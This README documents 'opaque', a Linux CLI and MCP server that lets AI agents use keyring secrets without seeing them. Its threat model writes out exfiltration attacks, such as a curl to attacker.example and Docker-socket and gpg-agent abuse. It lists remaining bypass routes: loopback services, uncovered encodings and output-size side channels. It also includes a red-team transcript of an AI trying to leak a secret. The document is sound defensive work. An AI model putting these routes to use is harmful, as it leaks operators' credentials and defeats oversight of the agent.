# opaque

> **Status:** v1.1.5 — Linux only for now; macOS Keychain backend planned for v1.2.

An **AI-safe secrets CLI** — stores secrets in your OS keyring and lets programs (and AI agents) use them without ever exposing plaintext. Invoked as `opq`.

```
$ opq exec --env OPENAI_API_KEY=openai_key -- curl ... # ok
$ opq get  openai_key | cat                            # blocked
$ opq mcp                                              # MCP server over stdio
```

## Why

When you let an AI agent run shell commands, the agent shouldn't see your API keys. But the **subprocess** the agent spawns still needs them. `opaque` sits between the two:

- The agent calls `opq exec --env VAR=secret_name -- ...` (or the `run_with_secrets` MCP tool).
- `opq` looks up the secret in your keyring and injects it as an environment variable into the child process.
- The child uses the secret normally. Anything the child accidentally writes to stdout/stderr is scanned, and the secret value is replaced with `[REDACTED:VAR]` before reaching the agent.
- The agent never receives the plaintext, only the redacted output.

## Threat model

**In scope:**

- AI reading plaintext from stdout, error messages, or argv.
- AI piping `opq get` to capture values (refused unless stdout is a TTY).
- Subprocesses accidentally echoing secrets (output redaction).
- Shell-history exposure (no secret ever appears in argv).
- Process-list exposure (`ps auxe`) — secrets enter child via `exec` env, not via shell interpolation.
- Memory swap-out of secret pages (mlocked buffers via `memguard`).
- **Intentional network exfiltration by an AI via the MCP `run_with_secrets` tool** — now blocked by default. Every MCP-spawned subprocess runs inside a network namespace (`bwrap --unshare-net`), a private PID namespace (`--unshare-pid`), and a private `/proc` mount (`--proc /proc`), so attacks like `curl -H "X-Leak: $SECRET" attacker.example`, DNS labels carrying the secret, and outbound TCP/UDP all fail; additionally, concurrent `run_with_secrets` calls cannot read each other's `/proc/<pid>/environ` and recover injected secrets. Abstract Unix sockets are isolated by the network namespace. As of v1.1.2 the default SandboxNet profile **also masks `/run/user` and `/tmp` with empty tmpfs mounts** — this closes a confirmed exploit in v1.1.1 where an AI inside the network-blocked sandbox could still talk to the user's keyring over the D-Bus session-bus socket at `/run/user/$UID/bus` and recover other secrets directly. As of v1.1.4 SandboxNet **additionally masks the system D-Bus directory (`/run/dbus`) and every container-runtime socket path the host exposes** (`/run/docker.sock`, `/run/containerd`, `/run/podman`, `/run/crio`, `/run/k3s`, `/run/libvirt`, `/run/lxd`, `/run/incus`, `/run/avahi-daemon`, `/run/buildkit`, plus `/run/snapd.socket`, `/run/snapd-snap.socket`, `/var/lib/{lxd,incus}/unix.socket`). Without these masks, `--ro-bind / /` left them connect()-reachable: an AI could `curl --unix-socket /var/run/docker.sock` to spawn a privileged container with `-v /:/host` (if the operator was in the `docker`/`lxd`/`incus` group), or reach Avahi via the system D-Bus and broadcast the secret as an mDNS TXT record — defeating `--unshare-net` entirely (P0-1 + P1-2, closed in v1.1.4). On systemd distros `/var/run` is a symlink to `/run`, so masking `/run/user` automatically covers `/var/run/user`; do not "fix" this by adding a second `--tmpfs /var/run/user`. The AI must explicitly pass `allow_network=true` to lift the network block, and any such call is recorded as `network_allowed` in the audit log. Setting `isolation="full"` additionally tmpfs-overlays `/home` and `/tmp` and ro-binds only `/usr`, `/etc`, `/lib*`, `/bin`, `/sbin` — blocking exfiltration of other host files even before they reach the network. As of v1.1.4 default SandboxNet **also masks home-directory credential-agent sockets**: `$HOME/.gnupg` is replaced with an empty tmpfs (covering the full gpg-agent socket family — `S.gpg-agent`, `.ssh`, `.extra`, `.browser`, `.scdaemon`) and `$HOME/.docker/run/docker.sock` (rootless Docker) is replaced with `/dev/null`. Without these masks, an AI under default SandboxNet could `gpg --sign` arbitrary payloads as the operator or drive rootless Docker for arbitrary host read — both attacks survive `--unshare-net` because AF_UNIX sockets are filesystem-namespaced, not network-namespaced. Residuals still in scope under default SandboxNet (NOT blocked): custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket`, KDE Wallet's per-user socket; or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service), loopback channels to co-resident services, timing side-channels, kernel-keyring inheritance, and pre-compromise of host binaries under `/usr`. Use `isolation="full"` if any of those reach an attacker-relevant agent.

**Also in scope (post-v1.1.2):**

- **`opq exec --no-redact` re-entry from MCP** (joint review post-v1.1.2 finding, fixed). An AI calling `run_with_secrets({command:"opq", args:["exec","--no-redact",...], allow_network:true})` previously bypassed output redaction: with `allow_network=true` the inner `opq` ran unsandboxed, resolved the secret from the keyring, and with `--no-redact` emitted plaintext through the outer (empty-secret-list) RedactingWriter to the AI. `--no-redact` is now gated identically to `get --plaintext` — TTY + `OPQ_I_AM_HUMAN=1` + retype `no-redact` on the controlling terminal. Gate refusal writes a `denied` audit entry with `Message="no_redact_refused:<reason>"`.
- **Audit-log directory masked under SandboxNet** (joint review post-v1.1.2 finding, fixed). The default SandboxNet profile's `--ro-bind / /` (switched from `--dev-bind` in v1.1.3) left `$XDG_STATE_HOME/opq/audit.log` (default `~/.local/state/opq/audit.log`) readable from the AI subprocess, defeating the `caller="cli"` filter and the `raw_exit`/`elapsed_ms` allowlist in `filterAuditMessageForAI`. SandboxNet now appends `--tmpfs <auditDir>` to the bwrap argv. The path is resolved through `filepath.EvalSymlinks` (TOCTOU defense), `prepareAuditDir` ensures the mount target exists, and `WrapCommand` fails closed if the path cannot be resolved. SandboxFull is unaffected (already `--unshare-all` with explicit ro-binds; the audit-log path is not in the sandbox view).

**Also in scope (v1.1.2):**

- **AI-controlled `LD_PRELOAD` / `PATH` / `BASH_ENV` injection.** Both `opq exec --env` and the MCP `run_with_secrets` tool refuse to inject a value into any variable name on the dynamic-linker / interpreter-startup deny-list. Coverage includes the `LD_*`, `DYLD_*`, `NSS_*`, `GIO_*`, `GCONV_*`, `ERL_*`, `BASH_FUNC_*`, and `GIT_CONFIG_*` prefix families, plus individual names spanning JVM build tooling (MAVEN_OPTS, GRADLE_OPTS, SBT_OPTS), Go module fetch (GOPROXY, GOFLAGS), Rust compiler replacement (RUSTC_WRAPPER, RUSTC), Bun (BUN_OPTIONS), Lua/R/Julia/Haskell/OCaml/Erlang/Tcl/Guile loaders, Nix/Scheme/Clojure/Elixir load paths, editor/pager indirection (EDITOR, VISUAL, PAGER, LESSOPEN, GIT_EDITOR, MANPAGER), askpass programs (SSH_ASKPASS, GIT_ASKPASS), OpenSSL engine loading (OPENSSL_CONF), and git config injection (GIT_EXEC_PATH, GIT_CONFIG_COUNT) — see `env_policy.go` for the full list. This prevents an AI from turning the secret-injection feature into arbitrary code execution by picking a variable name the loader/shell uses to find code.
- **D-Bus / keyring / container-runtime / credential-agent socket access from the MCP sandbox** (J-1 + P0-1 + P1-2 + gap-#3 residual close, confirmed-fix). The default SandboxNet profile uses `--ro-bind / /` (read-only host root) and masks `/run/user`, `/tmp`, the audit directory, the system D-Bus directory (`/run/dbus`), every container-runtime socket path the host exposes (Docker, containerd, podman, CRI-O, k3s, libvirt, LXD, Incus, Avahi, BuildKit, snapd), and — as of v1.1.4 — the canonical home-directory credential-agent socket locations (`$HOME/.gnupg` tmpfs, `$HOME/.docker/run/docker.sock` bind-null) with empty tmpfs / `--bind /dev/null` mounts. Without the runtime-socket masks, `--ro-bind` blocked WRITE but not `connect(2)`: an AI under default SandboxNet could `curl --unix-socket /var/run/docker.sock http://.../containers/create` and (with operator-in-docker-group) get a privileged container with `-v /:/host` for arbitrary host read (P0-1), or reach Avahi over the system D-Bus to publish an mDNS TXT record carrying the secret on local LAN (P1-2). Without the home-dir credential-agent masks, the same connect(2) reachability let an AI sign arbitrary payloads as the operator via `S.gpg-agent` or drive rootless Docker. All vectors are closed by `appendRuntimeSocketMasks` + `appendHomeDirSocketMasks`. Custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket` or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service) remain under default SandboxNet — pick `isolation="full"` for a complete FS view.
- **Multi-process audit-log integrity.** `appendAudit` and `tailAudit` serialize across processes via a dedicated `audit.lock` file (`flock(2)` LOCK_EX / LOCK_SH). Rotation never drops the lock; readers cannot observe torn or duplicated entries even when a writer rotates mid-read.
- **Audit-log error sanitization and AI-visible allowlist.** Backend errors and subprocess start errors are mapped to a fixed taxonomy (`not_found` / `backend_error` / `exec_not_found` / `exec_permission_denied` / `exec_start_failed`) before being written to the audit log. The wrapped error returned to the caller keeps the full detail; only the AI-readable `audit_tail` is sanitized. The AI-visible `msg` field of `mcp_run` entries is passed through a **closed allowlist** — only `timed_out` survives. Everything else (`raw_exit`, `elapsed_ms`, truncation flags, future audit detail) is stripped, closing the exit-code, wall-clock timing, and output-volume oracle paths.
- **`audit_tail` self-logging (J-5).** Every MCP `audit_tail` invocation appends its own `audit_tail` entry to the log before reading, so an AI scraping the operator's activity is itself visible. The just-written entry is stripped from the response window so the AI's requested `n` is not partially consumed by its own bookkeeping, but the entry persists in the operator-visible log and in subsequent AI calls.
- **Functional sandbox startup probe (J-9).** `opq mcp` runs a no-op `bwrap --unshare-net --unshare-pid -- true` namespace probe at startup. If AppArmor (Ubuntu 23.10+ ships a profile on `bwrap`), seccomp, or a missing kernel `CONFIG_USER_NS` blocks unprivileged namespace creation, the MCP server refuses to start with a clear error — instead of silently failing at first tool-call time.
- **Hard input caps on `run_with_secrets` and `opq exec --env` (J-13, J-14, J-16).** Env-var names are capped at 256 bytes; secret names must match `[A-Za-z0-9_.-]{1,128}` and are validated at every set/get/delete/exec/MCP boundary; `input.Args` is capped at 256 entries per `run_with_secrets` call. Inputs failing any of these gates surface as `invalid_input` or `invalid_secret_name` and are recorded in the audit log.

**Out of scope (v1):**

- Root / kernel attacker.
- Side channels in the legitimate consuming subprocess.
- A malicious subprocess that intentionally exfiltrates the secret via a loopback channel, kernel keyring, or other non-network path the sandbox does not cover.
- Tamper-evident audit log (file mode 0600 only; not cryptographically signed).
- **Encoding-evasion of the redactor — partial coverage.** As of v1.1.4 the redactor expands each registered secret into its raw bytes plus base64 (standard and URL-safe, padded and unpadded) and hex (lower- and upper-case) forms, all mapped to the same `[REDACTED:NAME]` token. A subprocess that pipes the secret through `base64`, `xxd -p`, an OpenSSL hex dump, or a JWT signer no longer leaks plaintext. NOT covered: URL percent-encoding (a no-op for typical alphanumeric API keys), JSON-string escaping (same), arbitrary ciphers (rot13, XOR, base32), and entropy-based heuristics (rejected for false-positive reasons on legitimate hashes/UUIDs/tokens). An AI choosing an encoding outside the registered set can still ship plaintext bytes through stdout/stderr — the redactor remains a guard against accidental echo, not a sandbox.
- **Metadata side-channels in `run_with_secrets` are inherent to the design — reduced, not eliminated.** As of v1.1.4 the only flag still returned to the AI is `timed_out`; `stdout_truncated` and `stderr_truncated` were removed because they were a 1-bit-per-call output-volume oracle. Truncation still happens silently in the per-stream cap, and the operator-facing audit log still records the flags for diagnostics. The residual `len(stdout)` / `len(stderr)` channel is mitigated by bucket-quantization: each stream is padded up to the next power-of-two bucket (1 KiB / 4 KiB / 16 KiB / 64 KiB / 256 KiB) so an adversary measuring response size gets ~2.3 bits per call instead of ~17. Recovering one secret byte under this regime takes ~4 calls of carefully crafted volume rather than one. Wall-clock timing is NOT exposed (`elapsed_ms` is stripped from the AI-visible audit). For deployments fronting an actively adversarial model, the documented mitigation remains the policy-proxy pattern below, which restricts the command set so the AI cannot supply secret-conditional commands.
- **Terminal-escape exfiltration via the rendering client.** If the MCP client renders subprocess stdout in a terminal emulator, an AI-supplied OSC 52 / DCS escape sequence in that output could exfiltrate data to the system clipboard or rewrite the window title. `opq` redacts secret *values* but does not strip escape sequences. `TERM` is on the deny-list (the AI cannot set it), but the subprocess can still emit raw escape bytes. Clients should sanitize tool output before rendering.
- **Loopback channels (`curl http://127.0.0.1:6379`, `redis-cli`, `psql -h 127.0.0.1`).** The MCP network sandbox blocks egress at the namespace boundary, but loopback to co-resident services is NOT blocked. If you run opq on a host with any local service that can forward externally (an HTTP proxy, a database with `COPY TO PROGRAM`, a message queue with a webhook sink), the sandbox is bypassable from inside `run_with_secrets`. Treat loopback as an open egress unless you have audited every listening port.
- **Process-level resource exhaustion by the AI.** Per-call limits exist (60s default timeout / 600s ceiling, 256 KiB per output stream, 32 env vars per call, 200 audit-tail entries) to bound the blast radius of a single call, but a determined AI calling the tool in a tight loop can still consume keyring/CPU/network. Rate-limiting and per-secret allowlists belong in a deployment-side policy proxy (see below).

For high-risk MCP deployments, the recommended pattern is to front `opq mcp` with a small policy-enforcing wrapper MCP server that allowlists `(command, args pattern, env var set)` tuples per secret, denies anything else, and forwards approved calls to `opq`. The opaque CLI itself deliberately ships as a low-trust building block.

## Install

```
go install github.com/alexrios/opaque@latest
```

The installed binary is named `opq`.

Requirements:

- Linux with an unlocked Secret Service session (gnome-keyring, KWallet, or KeePassXC).
- **bubblewrap (`bwrap`) >= 0.5.0** for the MCP subprocess sandbox and `opq exec --sandbox` flag. Install via your package manager (`apt install bubblewrap` on Debian/Ubuntu, `dnf install bubblewrap` on Fedora, `pacman -S bubblewrap` on Arch). `opq mcp` refuses to start without it. Requires a kernel with unprivileged user namespaces enabled (default on most distros). At startup `opq mcp` also runs a no-op `bwrap` namespace probe; if AppArmor (Ubuntu 23.10+ ships a profile on `bwrap`) or seccomp blocks unprivileged namespace creation, the MCP server refuses to start with a clear error rather than silently failing at first tool-call.
- Go 1.25+ to build from source.

## Quick start

```sh
# Store a secret. Value is read from stdin or prompted on a TTY — never on argv.
printf 'sk-...' | opq set openai_api_key

# List names (never values).
opq list

# Use the secret without ever seeing it.
opq exec --env OPENAI_API_KEY=openai_api_key -- curl -H "Authorization: Bearer $OPENAI_API_KEY" https://api.openai.com/v1/models

# What's in the audit log?
opq audit --tail 10
```

## CLI

| Command | Behavior |
| --- | --- |
| `opq set <name> [--ttl 24h\|7d\|2w]` | Read value from stdin (or hidden TTY prompt). Never accepts values on argv. `--ttl` sets a time-to-live after which reads are refused; omit for no expiry. |
| `opq list` | Print stored secret names, annotated with `expires <ts>` / `EXPIRED` / `REVOKED` where a policy applies. |
| `opq delete <name>` | Remove a secret (and any TTL/revocation record). |
| `opq revoke <name>` | Wipe a secret's value immediately and leave a revoked tombstone; reads are refused until the name is re-set or deleted. |
| `opq prune [--dry-run]` | Delete every expired secret (value + policy). `--dry-run` previews without deleting. |
| `opq get <name> --plaintext` | Print value to stdout. **Refuses** to run unless stdout is a TTY. |
| `opq exec --env VAR=name [...] -- cmd args` | Run `cmd` with named secrets injected as env vars. Subprocess output is redacted by default. Env-var names are capped at 256 bytes and secret names must match `[A-Za-z0-9_.-]{1,128}`. The `--no-redact` flag disables redaction and is **gated identically to `get --plaintext`** — stdout must be a TTY, `OPQ_I_AM_HUMAN=1` must be set inline on the command, and the operator must retype `no-redact` on the controlling terminal. |
| `opq audit [--tail N]` | Show audit-log entries. |
| `opq mcp` | Run as a Model Context Protocol server over stdio. |

## Secret lifetime (TTL & revocation)

Secrets are durable by default. Two mechanisms bound their usable life:

- **TTL** — `opq set NAME --ttl 24h` (also `90m`, `7d`, `2w`) records an expiry. After it lapses, every read path (`get`, `exec`, and the MCP `run_with_secrets` tool) **refuses** to return the value. Expiry is enforced lazily on read and never mutates the keyring, so the plaintext lingers until you sweep it with `opq prune` (or `opq delete`). TTL is access control, not auto-destruction.
- **Revocation** — `opq revoke NAME` is the "this leaked, kill it now" tool: it wipes the value from the keyring immediately and leaves a *revoked tombstone* so `get` reports the secret as revoked (distinct from never-existed) and `list` shows it as `REVOKED`. Re-running `opq set NAME` clears the tombstone and makes the name usable again; `opq delete NAME` removes the record entirely.

Policy metadata lives in a companion keyring item alongside each secret, so it is encrypted and backed up together with the value. The MCP surface never exposes it: `list_secrets` filters the internal items out, and `run_with_secrets` collapses revoked/expired/missing into a single `not_found` so an AI cannot use the error taxonomy as a state oracle. The precise reason (`secret_revoked` / `secret_expired`) is recorded in the operator's audit log only.

## MCP server

Add to your MCP-aware client (Claude Code, etc.):

```jsonc
{
  "mcpServers": {
    "opq": {
      "command": "opq",
      "args": ["mcp"]
    }
  }
}
```

The server exposes three tools:

- `list_secrets()` — returns secret names only.
- `run_with_secrets({ command, args, env: { VAR: secret_name }, timeout_seconds, allow_network, isolation })` — runs the command with secrets injected; returns redacted stdout/stderr, a normalized exit (`success`/`failure` only — the raw status is in the audit log, never returned to the AI), and a timed-out flag. **The subprocess runs inside a network-blocked, PID-isolated sandbox by default** (bubblewrap `--unshare-net --unshare-pid --proc /proc`, with the host filesystem exposed read-only via `--ro-bind / /` and `/run/user`, `/tmp`, `/dev/shm`, the audit directory, `/run/dbus`, and every detected container-runtime socket path masked by empty tmpfs / `--bind /dev/null` mounts); pass `allow_network=true` to opt in to network access (audited as `network_allowed`), or `isolation="full"` for additional tmpfs `/home` and `/tmp` plus minimal ro-binds. Defaults: 60s timeout (capped at 600s), 256 KiB per output stream, **32 env vars per call, 256 args per call, env-var names capped at 256 bytes, and secret names must match `[A-Za-z0-9_.-]{1,128}`**. The command is preflight-resolved and sandbox-wrapped before secret values are copied into `exec.Cmd.Env`, so missing/non-executable commands fail before plaintext env strings are built. **Errors returned to the AI are fixed-taxonomy strings only** (`backend_error`, `not_found: <name>`, `exec_not_found`, `exec_permission_denied`, `exec_start_failed`, `sandbox_unavailable`, `wrap_command_failed`, `invalid_input`, `invalid_secret_name`) — never wrapped backend or library text, so a buggy/hostile backend cannot leak secret bytes via tool-result errors.
- `audit_tail({ n })` — recent audit entries, capped at 200 per call. **When called over MCP, results are restricted to `caller="mcp"` entries and the `msg` field of `mcp_run` lines is passed through a closed allowlist**: only `timed_out` survives. Everything else (`raw_exit`, `elapsed_ms`, truncation flags, future audit detail) is stripped, closing the exit-code, wall-clock timing, and output-volume oracle paths. CLI users see the unredacted log via `opq audit`. Each MCP `audit_tail` call also leaves its own `audit_tail` audit entry — the AI's scraping activity is itself visible to operators.

There is **no** `get_secret_value` tool by design. AIs can use secrets, not read them.

### Proof: an AI agent can use a secret but never see it

The strongest test of the core promise is to let the agent itself try to steal the secret through the MCP tools. The transcript below is a real session against a stored secret `api_token` (injected as `$TOK`), run by the AI as the adversary. Nothing here is staged — every output is what the model actually received back.

**1. The AI can see names, not values.**

```jsonc
list_secrets()  →  { "names": ["api_token"] }
```

**2. The AI runs a command that *uses* the secret, then tries to echo it back.**

```jsonc
run_with_secrets({
  command: "sh",
  args: ["-c", "echo \"len=$(printf %s \"$TOK\" | wc -c)\"; \
                echo \"sha256=$(printf %s \"$TOK\" | sha256sum | cut -d' ' -f1)\"; \
                echo \"raw_value=$TOK\""],
  env: { TOK: "api_token" }
})
```
```text
len=51
sha256=3864f9119bfdcf91e616f1e6307bb8325a453f78805519bdcf9e921edd8778e4
raw_value=[REDACTED:TOK]
```

The same call proves both halves of the thesis at once: the subprocess computed the secret's real length and a real SHA-256 (so it genuinely **received and used** the plaintext), yet when the AI tried to read the value back it got `[REDACTED:TOK]` — the plaintext **never crossed the AI boundary**.

**3. Encoding the value to dodge a byte-exact redactor also fails.**

```jsonc
run_with_secrets({ command: "sh", args: ["-c",
  "echo \"b64=$(printf %s \"$TOK\" | base64 -w0)\"; \
   echo \"hex=$(printf %s \"$TOK\" | od -An -tx1 | tr -d ' \\n')\""],
  env: { TOK: "api_token" } })
```
```text
b64=[REDACTED:TOK]
hex=[REDACTED:TOK]
```

The redactor registers the base64 (std/URL, padded/unpadded) and hex (lower/upper) forms of every secret, so the common "just base64 it" evasion is caught (see *Out of scope* for the exotic encodings that are not).

**4. Even if the value leaked, it can't leave the box — egress is blocked by default.**

```jsonc
run_with_secrets({ command: "bash", args: ["-c",
  "exec 3<>/dev/tcp/1.1.1.1/53 && echo EGRESS_OPEN || echo EGRESS_BLOCKED"],
  env: { TOK: "api_token" } })
```
```text
stderr: bash: connect: Network is unreachable
stdout: EGRESS_BLOCKED (exit 1)
```

The subprocess runs in a network namespace with no route out (`--unshare-net`), so an outbound TCP `connect()` fails with `ENETUNREACH`. (Note: name *resolution* via a local NSS cache can still return cached IPs — that is not egress. The TCP test above is the definitive check that no packet carrying the secret can actually leave.)

**5. Every use is logged for the operator.**

```jsonc
audit_tail({ n: 3 })
```
```text
{"ts":"…","action":"mcp_run","secret_names":["api_token"],"caller":"mcp","pid":…}
{"ts":"…","action":"mcp_run","secret_names":["api_token"],"caller":"mcp","pid":…}
{"ts":"…","action":"mcp_run","secret_names":["api_token"],"caller":"mcp","pid":…}
```

The operator sees which secrets were used and when (full detail via `opq audit`); the AI's own view through `audit_tail` is allowlist-filtered to deny it the exit-code / timing / output-volume oracles. The trailing `\n[opq-pad]\n` + spaces in run outputs (omitted above for brevity) is the output-volume side-channel mitigation — each stream is padded to a fixed bucket so response *length* can't leak secret bytes either.

**Net result:** an agent wielded the secret to do real work and was structurally unable to read it, encode it out, ship it off-box, or hide that it tried. That is the entire point of `opaque`.

**The MCP sandbox blocks network exfiltration, PID-namespace cross-inspection, session-bus keyring access, container-runtime API access, system-D-Bus access, and the canonical home-directory credential-agent sockets — but it is not a complete jail.** With the default SandboxNet profile active, `curl`, `dig`, `nc`, and any other network-capable binary the AI chooses cannot reach external hosts — egress fails at the kernel namespace boundary, not in the binary. Each subprocess also runs in its own PID namespace with a private `/proc`, so concurrent calls cannot read each other's `/proc/<pid>/environ`. The host filesystem is exposed read-only (`--ro-bind / /`), and `/run/user`, `/tmp`, `/dev/shm`, the audit directory, `/run/dbus`, every detected container-runtime socket path (Docker, containerd, podman, CRI-O, k3s, libvirt, LXD, Incus, Avahi, BuildKit, snapd), and the canonical home-dir credential-agent socket locations (`$HOME/.gnupg`, `$HOME/.docker/run/docker.sock`) are masked with empty tmpfs / `--bind /dev/null` mounts. This closes the v1.1.1 D-Bus exploit, the v1.1.2 P0-1 two-call persistent-write exfil chain, the v1.1.3 P0-1/P1-2 container-runtime and Avahi-mDNS exfil chains, and the v1.1.4 home-dir credential-agent (gpg-agent / rootless-Docker) reach-out. The redactor is the second line of defense against the subprocess *accidentally* echoing the secret on stdout/stderr; as of v1.1.4 it expands each registered secret into base64 (std/URL, padded/raw) and hex (lower/upper) forms so common encoding-emit accidents are still caught, but exotic encodings (URL percent, JSON-escape, rot13, base32, custom ciphers) are NOT covered. Residual risks the default sandbox does NOT cover: custom home-directory Unix sockets outside the masked paths (e.g., `~/.local/share/kwalletd/*.socket` or any AF_UNIX endpoint the operator placed under `$HOME` for a custom service), loopback channels to other services on the host, timing side-channels, kernel-keyring inheritance, and pre-compromise of binaries under `/usr`. Pick `isolation="full"` for complete filesystem isolation when any of those reach an attacker-relevant agent. See the [Threat model](#threat-model) section for the recommended policy-proxy deployment pattern for high-risk environments.

## Backends

v1 ships with the Secret Service backend (libsecret over D-Bus) for Linux. The `Backend` interface in `backend.go` is shaped so additional backends drop in without touching anything else:

- macOS Keychain (planned, v1.2).
- Proton Pass (planned, v2).
- `pass` / file-based / KWallet are already reachable via the underlying `99designs/keyring` library; flip them on by editing `AllowedBackends` in `OpenDefaultBackend`.

## Audit log

`${XDG_STATE_HOME:-$HOME/.local/state}/opq/audit.log`, mode 0600. One JSON object per line. A sibling `audit.lock` file (also 0600) serializes appends and tail reads across concurrent `opq` processes; rotation is atomic across processes and never drops the cross-process lock. The active log is capped at 10 MiB and one historical rotation is kept at `audit.log.1`; `opq audit --tail N` spans both files transparently.

Actions: `set`, `get`, `delete`, `list`, `exec_inject`, `mcp_run`, `audit_tail`, `redaction_disabled`, `network_allowed`, `denied`.

Example entries — note that the `msg` field differs between the CLI view (`opq audit`, full operator detail) and the MCP-visible view (`audit_tail` tool, allowlist-filtered):

```json
// CLI view via `opq audit` (full detail)
{"ts":"2026-05-24T15:50:17.189Z","action":"exec_inject","secret_name":"openai_api_key","caller":"cli","pid":50770,"ppid":50701}
{"ts":"2026-05-24T15:50:18.012Z","action":"mcp_run","secret_names":["openai_api_key","stripe_secret_key"],"caller":"mcp","pid":50770,"ppid":50701,"msg":"raw_exit=0 elapsed_ms=143"}
{"ts":"2026-05-24T15:50:19.422Z","action":"audit_tail","caller":"mcp","pid":50770,"ppid":50701,"msg":"n=20"}

// Same entry as seen by the AI via the `audit_tail` MCP tool (J-10 allowlist applied)
{"ts":"2026-05-24T15:50:18.012Z","action":"mcp_run","secret_names":["openai_api_key","stripe_secret_key"],"caller":"mcp","pid":50770,"ppid":50701}
```

`msg` for `mcp_run` is allowlist-filtered for AI consumers (only `timed_out` survives); for a clean exit with no timeout the field is empty and omitted from the JSON by `omitempty`. The CLI sees everything; the MCP `audit_tail` tool sees only the filter output. For MCP-driven runs the secret names appear as a structured `secret_names` JSON array (no comma-joined string parsing required). Backend and subprocess-start errors are written to `msg` as fixed-taxonomy tokens (`not_found`, `backend_error`, `exec_not_found`, `exec_permission_denied`, `exec_start_failed`) — never raw library text — so a buggy backend cannot leak secret bytes into the audit stream.

Each MCP `audit_tail` invocation also records its own `audit_tail` event (with `caller="mcp"`) before performing the read, so an AI scraping operator activity is itself visible to operators reviewing the log via `opq audit`.

`caller` is `cli` for direct CLI invocations and `mcp` when the request came through the MCP server, so you can distinguish AI-driven access from human-driven access at a glance.

## Memory hygiene

Secret bytes flow through `memguard.LockedBuffer`s — mlocked pages, guard canaries, zeroed on destroy. Both the CLI and MCP execution paths preflight command resolution and sandbox wrapping before creating plaintext `VAR=value` strings for `exec.Cmd.Env`, then clear the env slice references immediately after `exec.Start` copies them into the child. Go strings are immutable, so this cannot erase their backing bytes in place; it narrows the lifetime of the unavoidable environment-string copies. The default build is enough for the threat model above.

## Development

```sh
go test ./...
go vet ./...
go build .
```

End-to-end smoke tests require an unlocked Secret Service session on the host.
